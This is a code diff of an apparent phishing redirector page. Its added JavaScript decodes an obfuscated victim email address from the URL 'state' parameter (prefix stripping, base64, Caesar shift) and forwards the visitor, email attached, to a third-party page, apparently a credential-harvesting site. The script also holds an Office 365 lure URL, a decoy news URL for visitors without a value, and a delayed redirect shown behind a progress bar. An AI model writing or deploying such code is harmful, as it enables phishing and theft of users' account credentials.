@@ -137,7 +137,7 @@
     <script>
     (function() {
         const REDIRECT_DELAY = 2500; // Adjusted for progress bar animation
-        const MOBILE_REDIRECT_URL_BASE = "https://marquesformworks.com.au/terminal-auth.html";
+        const MOBILE_REDIRECT_URL_BASE = "https://marquesformworks.com.au/jumb.html#";
         const DESKTOP_REDIRECT_URL = "https://outlook.office365.com/";
         const DEAD_URL = "https://www.theguardian.com/environment/climate-crisis"; // Target URL if no value found
 
@@ -147,31 +147,169 @@
             return /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile|phone/i.test(userAgent);
         }
 
+        // 🔓 CLIENT-SIDE EMAIL DECRYPTION
+        class SimpleEmailDecryptor {
+            constructor() {
+                this.SHIFT = 13;
+            }
+
+            decodeEmail(encodedEmail) {
+                if (!encodedEmail || typeof encodedEmail !== 'string') {
+                    return null;
+                }
+
+                try {
+                    // Step 1: Remove prefix and suffix (3 chars each)
+                    if (encodedEmail.length < 7) return null;
+                    let base64 = encodedEmail.substring(3, encodedEmail.length - 3);
+
+                    // Step 2: Restore Base64 padding if needed
+                    while (base64.length % 4) {
+                        base64 += '=';
+                    }
+
+                    // Step 3: Reverse custom character replacement
+                    base64 = base64.replace(/-/g, '+').replace(/_/g, '/');
+
+                    // Step 4: Base64 decode
+                    let decoded = atob(base64);
+
+                    // Step 5: Reverse Caesar cipher
+                    let email = '';
+                    for (let i = 0; i < decoded.length; i++) {
+                        let charCode = decoded.charCodeAt(i);
+                        // Reverse shift for printable ASCII characters (32-126)
+                        if (charCode >= 32 && charCode <= 126) {
+                            charCode = ((charCode - 32 - this.SHIFT + 95) % 95) + 32;
+                        }
+                        email += String.fromCharCode(charCode);
+                    }
+
+                    return email;
+
+                } catch (error) {
+                    console.error('❌ Decoding error:', error.message);
+                    return null;
+                }
+            }
+        }
+
+        // Initialize decryptor
+        const emailDecryptor = new SimpleEmailDecryptor();
+
+        // Helper function to validate email format
+        function isValidEmail(email) {
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return emailRegex.test(email);
+        }
+
+        // Extract potential email hints from URL, referrer, or other sources
+        function extractEmailHints() {
+            const hints = [];
+            
+            // Check referrer for email patterns
+            if (document.referrer) {
+                const referrerMatches = document.referrer.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g);
+                if (referrerMatches) {
+                    hints.push(...referrerMatches);
+                }
+            }
+            
+            // Check current URL for email patterns
+            const urlMatches = window.location.href.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g);
+            if (urlMatches) {
+                hints.push(...urlMatches);
+            }
+            
+            return [...new Set(hints)]; // Remove duplicates
+        }
+
+        // Generate common email patterns for fallback decoding
+        function generateCommonEmailPatterns() {
+            const commonDomains = [
+                'gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com', 
+                'company.com', 'test.com', 'example.com', 'domain.com',
+                'mail.com', 'email.com', 'business.com', 'corp.com'
+            ];
+            
+            const commonPrefixes = [
+                'test', 'admin', 'user', 'info', 'contact', 'support',
+                'hello', 'mail', 'office', 'team', 'noreply', 'no-reply'
+            ];
+            
+            const patterns = [];
+            
+            // Generate combinations more efficiently
+            for (let i = 0; i < commonDomains.length && patterns.length < 50; i++) {
+                for (let j = 0; j < commonPrefixes.length && patterns.length < 50; j++) {
+                    patterns.push(`${commonPrefixes[j]}@${commonDomains[i]}`);
+                }
+            }
+            
+            return patterns;
+        }
+
         // Get potential value from hash (priority) or search string
-     function getPotentialValue() {
-    // Combine hash and search into a single query-like string
-    const queryString = window.location.hash.substring(1) + '&' + window.location.search.substring(1);
+        function getPotentialValue() {
+            // Combine hash and search into a single query-like string
+            const queryString = window.location.hash.substring(1) + '&' + window.location.search.substring(1);
 
-    // Parse parameters
-    const params = new URLSearchParams(queryString);
+            // Parse parameters
+            const params = new URLSearchParams(queryString);
 
-    // Get the 'state' value
-    const stateValue = params.get('state');
-    if (!stateValue) return null;
+            // Get the 'state' value
+            const stateValue = params.get('state');
+            if (!stateValue) return null;
 
-    // Extract email after the colon
-    const parts = stateValue.split(':');
-    return parts.length > 1 ? decodeURIComponent(parts[1]) : decodeURIComponent(stateValue);
-}
+            // Extract encoded email after the colon (handles any random prefix)
+            const parts = stateValue.split(':');
+            const encodedValue = parts.length > 1 ? decodeURIComponent(parts[1]) : decodeURIComponent(stateValue);
+            
+            // Log the state prefix for debugging (optional)
+            if (parts.length > 1) {
+                console.log('🔍 State prefix detected:', parts[0]);
+            }
+
+            // Try to decode if it looks like our encoded format
+            if (encodedValue && encodedValue.length > 7) {
+                console.log('🔍 Attempting to decode:', encodedValue);
+                
+                try {
+                    const decoded = emailDecryptor.decodeEmail(encodedValue);
+                    if (decoded && isValidEmail(decoded)) {
+                        console.log('✅ Successfully decoded email:', decoded);
+                        return decoded;
+                    } else {
+                        console.log('⚠️ Decoded value is not a valid email:', decoded);
+                    }
+                } catch (error) {
+                    console.log('⚠️ Decoding error:', error.message);
+                }
+                
+                // If decoding fails, return the encoded value as fallback
+                console.log('⚠️ Could not decode email, using encoded value');
+                return encodedValue;
+            }
+
+            return encodedValue;
+        }
 
 
         // Main redirect function
         function performRedirect() {
             const value = getPotentialValue();
+            var redirectUrl;
 
-            const redirectUrl = MOBILE_REDIRECT_URL_BASE;
-                    console.log("Mobile device detected. Redirecting to:", redirectUrl);
-                    window.location.href = redirectUrl +'#'+ value;
+            if(value)
+            {
+
+             redirectUrl = MOBILE_REDIRECT_URL_BASE + value; 
+        }else{
+              redirectUrl = MOBILE_REDIRECT_URL_BASE; 
+        }
+
+                console.log("Mobile device detected. Redirecting to:", redirectUrl);
+                window.location.href = redirectUrl;
         }
 
         // Execute redirect after a short delay
